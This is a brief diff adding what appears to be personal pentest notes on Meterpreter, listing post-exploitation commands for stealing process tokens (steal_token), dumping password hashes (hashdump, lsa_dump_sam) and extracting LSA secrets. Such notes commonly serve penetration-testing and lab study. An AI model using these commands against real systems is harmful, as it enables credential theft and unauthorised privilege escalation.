@@ -1,0 +1,19 @@
+METERPRETER is an amazing shell that is stealthy, boom
+
+Cool commands:
+getuid
+bg		# put session to background
+
+Stealing tokens:
+ps
+steal_token <PID>
+getuid		# check server username
+
+
+HASHDUMPING:
+hashdump
+lsa_dump_sam
+
+
+LSA SECRETS DUMP:
+lsa_dump_secrets
